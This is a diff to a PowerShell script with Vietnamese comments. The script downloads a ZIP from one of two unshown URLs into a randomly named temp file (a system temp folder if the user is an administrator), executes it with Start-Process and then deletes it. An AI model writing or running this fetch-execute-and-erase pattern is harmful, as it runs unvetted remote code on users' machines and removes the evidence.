@@ -11,11 +11,11 @@ $isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -mat
 $FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\release_$rand.zip" } else { "$env:TEMP\release_$rand.zip" }
 
 try {
-    $response = Invoke-WebRequest -Uri $DownloadURL -UseBasicParsing
+    Invoke-WebRequest -Uri $DownloadURL -OutFile $FilePath -UseBasicParsing
 }
 catch {
     try {
-        $response = Invoke-WebRequest -Uri $DownloadURL2 -UseBasicParsing
+        Invoke-WebRequest -Uri $DownloadURL2 -OutFile $FilePath -UseBasicParsing
     }
     catch {
         Write-Host "Không thể tải xuống tệp ZIP."
@@ -23,12 +23,9 @@ catch {
     }
 }
 
-# Chỉ lưu nội dung của phản hồi vào tệp
-Set-Content -Path $FilePath -Value $response.Content
-Add-Type -AssemblyName System.IO.Compression.FileSystem
-[System.IO.Compression.ZipFile]::OpenRead($FilePath)
 # Thực thi tệp kịch bản đã tải về
 Start-Process $FilePath -Wait
 
 # Xóa tệp ZIP đã tải về
 Remove-Item $FilePath
+
